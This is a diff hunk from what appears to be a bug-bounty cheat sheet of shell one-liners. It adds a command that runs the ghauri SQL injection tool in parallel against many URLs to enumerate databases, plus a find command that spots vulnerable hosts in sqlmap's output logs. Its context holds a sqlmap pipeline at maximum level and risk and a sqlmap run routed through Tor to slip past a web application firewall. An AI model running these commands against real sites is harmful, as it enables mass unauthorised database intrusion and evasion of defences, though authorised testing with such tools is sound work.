@@ -151,9 +151,18 @@ cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/
 ```
 cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt ; sqlmap -m sqli.txt -batch --random-agent --level 5 --risk 3 --dbs
 ```
+***scan multiple hosts parallely***
+```
+cat urls.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch'
+```
 ***Bypass WAF using TOR***
 ```
 sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent
+```
+***find which host is vuln in output folder of sqlmap/ghauri***
+``root@bb:~/.local/share/sqlmap/output#``
+```
+find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
 ```
 ----------------
 ## CORS:
